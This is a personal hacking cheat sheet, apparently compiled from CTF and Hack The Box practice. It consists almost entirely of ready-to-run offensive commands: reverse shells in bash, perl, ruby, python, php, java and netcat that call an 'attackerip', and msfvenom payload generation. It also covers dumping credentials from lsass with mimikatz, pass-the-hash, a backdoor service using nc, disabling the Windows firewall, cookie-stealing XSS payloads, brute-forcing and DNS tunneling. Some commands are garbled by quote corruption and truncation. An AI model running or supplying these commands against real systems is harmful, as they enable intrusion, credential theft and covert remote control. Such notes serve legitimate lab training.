---
layout: memory
title: CheatSheet - Unordered Notes from CTFs and HTB 
---

# Benji's Hacking Cheatsheet
    List of commands and techniques to while conducting any kind of hacking
    "The quieter you become, The more you’re able to hear"
    
<center>
<p style="text-align:center;"><img src="/images/kali.png" alt="Logo"></p>
</center>

#### Apply the best nmap scanning strategy for all size networks

#### Host discovery, generate a list of surviving hosts

    $ nmap -sn -T4 -oG Discovery.gnmap 192.168.1.1/24
    $ grep “Status: Up” Discovery.gnmap | cut -f 2 -d ‘ ‘ > LiveHosts.txt

    #http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf

    $ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
    $ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt

#### Port found, found all the ports, but UDP port scanning will be very slow

    $ nmap -sS -T4 -Pn –top-ports 3674 -oG 3674 -iL LiveHosts.txt
    $ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
    $ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt

#### Displays the TCP / UDP port
    $ grep “open” FullTCP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “T:”$0}’
    $ grep “open” FullUDP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘{print “U:”$0}’

#### Detect the service version

    $ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
    $ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
    $ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt

Nmap to avoid the firewall

#### Segmentation
    $ nmap -f
#### Modify the default MTU size, but it must be a multiple of 8 (8, 16, 24, 32, etc.)
    $ nmap –mtu 24
#### Generate random numbers of spoofing
    $ nmap -D RND:10 [target]
#### Manually specify the IP to be spoofed
    $ nmap -D decoy1,decoy2,decoy3 etc.
#### Botnet scanning, first need to find the botnet IP
    $ nmap -sI [Zombie IP] [Target IP]
#### Designated source terminal
    $ nmap –source-port 80 IP
#### Add a random number of data after each scan
    $ nmap –data-length 25 IP
#### MAC address spoofing, you can generate different host MAC address
    $ nmap –spoof-mac Dell/Apple/3Com IP

#### Nmap for Web vulnerability scanning

    cd /usr/share/nmap/scripts/
    wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
    nmap -sS -sV –script=vulscan/vulscan.nse target
    nmap -sS -sV –script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
    nmap -sS -sV –script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
    nmap -PN -sS -sV –script=vulscan –script-args vulscancorrelation=1 -p80 target
    nmap -sV –script=vuln target
    nmap -PN -sS -sV –script=all –script-args vulscancorrelation=1 target

#### Web path scanner
    dirsearch 
    DirBuster
    Patator- password guessing attacks
    
#### Brute force with Patatpr
    git clone https://github.com/lanjelot/patator.git /usr/share/patator
    $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
    $ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    $ patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’

#### Use Fierce to brute DNS
#### Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server.

    # http://ha.ckers.org/fierce/
    $ ./fierce.pl -dns example.com
    $ ./fierce.pl –dns example.com –wordlist myWordList.txt

#### Use Nikto to scan Web services

    nikto -C all -h http://IP

    WordPress scan
    git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
    ./wpscan –url http://IP/ –enumerate p

#### HTTP fingerprint identification

    wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
    cd httprint_301/linux/
    ./httprint -h http://IP -s signatures.txt

#### Scan with Skipfish
#### Note: Skipfish is a Web application security detection tool, Skipfish will use recursive crawler and dictionary-based probe to generate an interactive site map, the resulting map will be generated after the security check output.

    skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP

#### Use the NC scan

    nc -v -w 1 target -z 1-1000
    for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done

#### Unicornscan
#### NOTE: Unicornscan is a tool for information gathering and security audits.

    us -H -msf -Iv 192.168.56.101 -p 1-65535
    us -H -mU -Iv 192.168.56.101 -p 1-65535

#### Use Xprobe2 to identify the operating system fingerprint

    xprobe2 -v -p tcp:80:open IP
    Enumeration of Samba

    nmblookup -A target
    smbclient //MOUNT/share -I target -N
    rpcclient -U “” target
    enum4linux target

#### Enumerates SNMP

    snmpget -v 1 -c public IP
    snmpwalk -v 1 -c public IP
    snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP

#### Useful Windows cmd command

    net localgroup Users
    net localgroup Administrators
    search dir/s *.doc
    system(“start cmd.exe /k $cmd”)
    sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” start= auto error= ignore
    /c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
    mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”
    Procdump.exe -accepteula -ma lsass.exe lsass.dmp
    mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”
    C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32
    C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64

#### PuTTY connects the tunnel

    Forward the remote port to the destination address
    plink.exe -P 22 -l root -pw “1234” -R 445:127.0.0.1:445 IP

#### Meterpreter port forwarding

    https://www.offensive-security.com/metasploit-unleashed/portfwd/
#### Forward the remote port to the destination address
    meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
    kali > rdesktop 127.0.0.1:3389

#### Enable the RDP service

    reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
    netsh firewall set service remoteadmin enable
    netsh firewall set service remotedesktop enable

#### Close Windows Firewall
    netsh firewall set opmode disable

Meterpreter VNC/RDP

    https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
    run getgui -u admin -p 1234
    run vnc -p 5043

#### Use Mimikatz

    Gets the Windows plaintext user name password

    git clone https://github.com/gentilkiwi/mimikatz.git
    privilege::debug
    sekurlsa::logonPasswords full

Gets a hash value

    git clone https://github.com/byt3bl33d3r/pth-toolkit
    pth-winexe -U hash //IP cmd

    or

    apt-get install freerdp-x11
    xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

    or
    
    meterpreter > run post/windows/gather/hashdump
    Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
    msf > use exploit/windows/smb/psexec
    msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
    msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
    msf exploit(psexec) > exploit
    meterpreter > shell
    
#### Use Hashcat to crack passwords    
    hashcat -m 400 -a 0 hash /root/rockyou.txt
    
#### Use the NC to fetch Banner information

    nc 192.168.0.10 80
    GET / HTTP/1.1
    Host: 192.168.0.10
    User-Agent: Mozilla/4.0
    Referrer: www.example.com
    <enter>
    <enter>


#### Use NC to bounce the shell on Windows

    c:>nc -Lp 31337 -vv -e cmd.exe
    nc 192.168.0.10 31337
    c:>nc example.com 80 -e cmd.exe
    nc -lp 80

nc -lp 31337 -e /bin/bash
nc 192.168.0.10 31337
nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000

Look for the SUID/SGID root file

#### Locate the SUID root file
find / -user root -perm -4000 -print

#### Locate the SGID root file:
find / -group root -perm -2000 -print

#### Locate the SUID and SGID files:
find / -perm -4000 -o -perm -2000 -print

#### Find files that do not belong to any user:
find / -nouser -print

#### Locate a file that does not belong to any user group:
find / -nogroup -print

#### Find soft links and point to:
find / -type l -ls

#### Python shell

    python -c ‘import pty;pty.spawn(“/bin/bash”)’

#### Python \ Ruby \ PHP HTTP server

    python2 -m SimpleHTTPServer
    python3 -m http.server
    ruby -rwebrick -e “WEBrick::HTTPServer.new(:Port => 8888, 😀
    ocumentRoot => Dir.pwd).start”
    php -S 0.0.0.0:8888

#### Gets the PID corresponding to the process

    fuser -nv tcp 80
    fuser -k -n tcp 80

#### Use Hydra to crack RDP

    hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp

#### Mount the remote Windows shared folder

    smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw

#### Under Kali compile Exploit

    gcc -m32 -o output32 hello.c
    gcc -m64 -o output hello.c

#### Compile Windows Exploit under Kali

    wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
    wine mingw-get-setup.exe
    select mingw32-base
    cd /root/.wine/drive_c/windows
    wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
    cd /root/.wine/drive_c/MinGW/bin
    wine gcc -o ability.exe /tmp/exploit.c -lwsock32
    wine ability.exe

#### NASM command

    Note: NASM, the Netwide Assembler, is a 80 x86 and x86-64 platform based on the assembly language compiler, designed to achieve the compiler program cross-platform and modular features.

    nasm -f bin -o payload.bin payload.asm
    nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload

#### SSH penetration

    ssh -D 127.0.0.1:1080 -p 22 user@IP
    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    proxychains commands target
    SSH penetrates from one network to another
    
    ssh -D 127.0.0.1:1080 -p 22 user1@IP1
    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
    Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
    proxychains commands target

#### Use metasploit for penetration

 

#### https://www.offensive-security.com/metasploit-unleashed/pivoting/
    meterpreter > ipconfig
    IP Address : 10.1.13.3
    meterpreter > run autoroute -s 10.1.13.0/24
    meterpreter > run autoroute -p
    10.1.13.0 255.255.255.0 Session 1
    meterpreter > Ctrl+Z
    msf auxiliary(tcp) > use exploit/windows/smb/psexec
    msf exploit(psexec) > set RHOST 10.1.13.2
    msf exploit(psexec) > exploit
    meterpreter > ipconfig
    IP Address : 10.1.13.2

#### Exploit-DB based on CSV file

    git clone https://github.com/offensive-security/exploit-database.git
    cd exploit-database
    ./searchsploit –u
    ./searchsploit apache 2.2
    ./searchsploit “Linux Kernel”

    cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep “<|<=” | sort -k3

#### MSF Payloads

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
    msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 –platform win -f asp -o file.asp
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b “\x00” -a x86 –platform win -f c

#### MSF generates the Meterpreter Shell that bounces under Linux
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 –platform linux -o shell

#### MSF build bounce Shell (C Shellcode)
    msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b “\x00\x0a\x0d” -a x86 –platform win -f c

#### MSF generates a bounce Python Shell
    msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py

#### MSF builds rebound ASP Shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 –platform win -o shell.asp

#### MSF generates bounce shells
    msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh

#### MSF build bounces PHP Shell
    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
    add <?php at the beginning
    perl -i~ -0777pe’s/^/<?php \n/’ shell.php

#### MSF generates bounce Win Shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 –platform win -o shell.exe

#### Linux commonly used security commands

    find / -uid 0 -perm -4000

    find / -perm -o=w

    find / -name ” ” -print
    find / -name “..” -print
    find / -name “. ” -print
    find / -name ” ” -print

    find / -nouser

    lsof +L1

    lsof -i

    arp -a

    getent passwd

    getent group

    for user in $(getent passwd|cut -f1 -d:); do echo “### Crontabs for $user ####”; crontab -u $user -l; done

    cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=’|fold -w 12| head -n 4

    find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
    chattr -i file

#### Windows Buffer Overflow exploits 

    msfvenom -p windows/shell_bind_tcp -a x86 –platform win -b “\x00” -f c
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 –platform win -e x86/shikata_ga_nai -b “\x00” -f c

#### COMMONLY USED BAD CHARACTERS:

    \x00\x0a\x0d\x20 For http request
    \x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c Ending with (0\n\r_)

#### Regular command:
    pattern create
    pattern offset (EIP Address)
    pattern offset (ESP Address)
    add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

    !pvefindaddr pattern_create 5000
    !pvefindaddr suggest
    !pvefindaddr nosafeseh


    !mona config -set workingfolder C:\Mona\%p

    !mona config -get workingfolder
    !mona mod
    !mona bytearray -b “\x00\x0a”
    !mona pc 5000
    !mona po EIP
    !mona suggest

#### SEH – Structured exception handling

Note: SEH (“Structured Exception Handling”), or structured exception handling, is a powerful processor error or exception weapon provided by the Windows operating system to the programmer.

    # https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
    # http://baike.baidu.com/view/243131.htm
    !mona suggest
    !mona nosafeseh
    nseh=”\xeb\x06\x90\x90″ (next seh chain)
    iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)

#### ROP (DEP)

Note: ROP (“Return-Oriented Programming”) is a computer security exploit technology that allows an attacker to execute code, such as un-executable memory and code signatures, in a security defense situation.

DEP (“Data Execution Prevention”) is a set of hardware and software technology, in memory, strictly to distinguish between code and data to prevent the data as code execution.

    # https://en.wikipedia.org/wiki/Return-oriented_programming
    # https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B
    # https://en.wikipedia.org/wiki/Data_Execution_Prevention
    # http://baike.baidu.com/item/DEP/7694630
    !mona modules
    !mona ropfunc -m *.dll -cpb “\x00\x09\x0a”
    !mona rop -m *.dll -cpb “\x00\x09\x0a” (auto suggest)

#### ASLR – Address space format randomization
    # https://en.wikipedia.org/wiki/Address_space_layout_randomization
    !mona noaslr 
#### EGG Hunter technology

Egg hunting This technique can be categorized as a “graded shellcode”, which basically supports you to find your actual (larger) shellcode (our “egg”) with a small, specially crafted shellcode, In search of our final shellcode. In other words, a short code executes first, then goes to the real shellcode and executes it. – Making reference to see Ice Forum , more details can be found in the code I add comments link.

    # https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
    # http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf
    # http://www.fuzzysecurity.com/tutorials/expDev/4.html
    !mona jmp -r esp
    !mona egg -t lxxl
    \xeb\xc4 (jump backward -60)
    buff=lxxllxxl+shell
    !mona egg -t ‘w00t’

#### GDB Debugger commonly used commands

    break *_start
    next
    step
    n
    s
    continue
    c

#### Data
    checking ‘REGISTERS’ and ‘MEMORY’

#### Display the register values: (Decimal,Binary,Hex)
    print /d –> Decimal
    print /t –> Binary
    print /x –> Hex
    O/P :
    (gdb) print /d $eax
    $17 = 13
    (gdb) print /t $eax
    $18 = 1101
    (gdb) print /x $eax
    $19 = 0xd
    (gdb)

#### Display the value of a specific memory address
    command : x/nyz (Examine)
    n –> Number of fields to display ==>
    y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
    z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)

#### BASH rebound Shell

    bash -i >& /dev/tcp/X.X.X.X/443 0>&1

    exec /bin/bash 0&0 2>&0
    exec /bin/bash 0&0 2>&0

    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

    exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
    exec 5<>/dev/tcp/attackerip/4444

    cat <&5 | while read line; do $line 2>&5 >&5; done # or:
    while read line 0<&5; do $line 2>&5 >&5; done

    /bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
    /bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1

#### PERL rebound Shell

    perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:443″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’

#### Win platform
    perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
    perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

#### RUBY rebound Shell

    ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’

#### Win platform
    ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
    ruby -rsocket -e ‘f=TCPSocket.open(“attackerip”,”443″).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’

#### PYTHON rebound Shell

    python -c ‘import                                                 socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“attackerip”,443));os.dup2(s.fileno(),0);                 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

#### PHP bounce Shell

    php -r ‘$sock=fsockopen(“attackerip”,443);exec(“/bin/sh -i <&3 >&3 2>&3”);’

#### JAVA rebound Shell

    r = Runtime.getRuntime()
    p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
    p.waitFor()

#### NETCAT rebound Shell

    nc -e /bin/sh attackerip 4444
    nc -e /bin/sh 192.168.37.10 443

#### If the -e parameter is disabled, you can try the following command
    # mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
    /bin/sh | nc attackerip 443
    rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/

#### If you installed the wrong version of netcat, try the following command
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f

    TELNET rebound Shell

#### If netcat is not available
    mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe

    XTERM rebound Shell

#### Enable the X server (: 1 – listen on TCP port 6001)

    apt-get install xnest
    Xnest :1

#### Remember to authorize the connection from the target IP
    xterm -display 127.0.0.1:1
#### Grant access
    xhost +targetip

#### Connect back to our X server on the target machine
    xterm -display attackerip:1
    /usr/openwin/bin/xterm -display attackerip:1
    or
    $ DISPLAY=attackerip:0 xterm

#### XSS

    # https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
    (“< iframes > src=http://IP:PORT </ iframes >”)

    <script>document.location=http://IP:PORT</script>

    ‘;alert(String.fromCharCode(88,83,83))//\’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//\”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

    “;!–”<XSS>=&amp;amp;{()}

    <IMG SRC=”javascript:alert(‘XSS’);”>
    <IMG SRC=javascript:alert(‘XSS’)>
    <IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>””>
    <IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>

    <IMG                     SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
    <IMG SRC=”jav ascript:alert(‘XSS’);”>

    perl -e ‘print “<IMG SRC=javascript:alert(\”XSS\”)>”;’ > out

    <BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>

    (“>< iframes http://google.com < iframes >)

    <BODY BACKGROUND=”javascript:alert(‘XSS’)”>
    <FRAMESET><FRAME SRC=”javascript:alert(‘XSS’);”></FRAMESET>
    “><script >alert(document.cookie)</script>
    %253cscript%253ealert(document.cookie)%253c/script%253e
    “><s”%2b”cript>alert(document.cookie)</script>
    %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
    <img src=asdf onerror=alert(document.cookie)>

    SSH Over SCTP (using Socat)

    $ socat SCTP-LISTEN:80,fork TCP:localhost:22
    $ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
    $ ssh -lusername localhost -D 8080 -p 1337

#### Metagoofil – Metadata collection tool

    Note: Metagoofil is a tool for collecting information using Google.
    $ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html

#### Use a DNS tunnel to bypass the firewall

    $ apt-get update
    $ apt-get -y install ruby-dev git make g++
    $ gem install bundler
    $ git clone https://github.com/iagox86/dnscat2.git
    $ cd dnscat2/server
    $ bundle install
    $ ruby ./dnscat2.rb
    dnscat2> New session established: 16059
    dnscat2> session -i 16059

    https://downloads.skullsecurity.org/dnscat2/
    https://github.com/lukebaggett/dnscat2-powershell
    $ dnscat –host <dnscat server_ip>
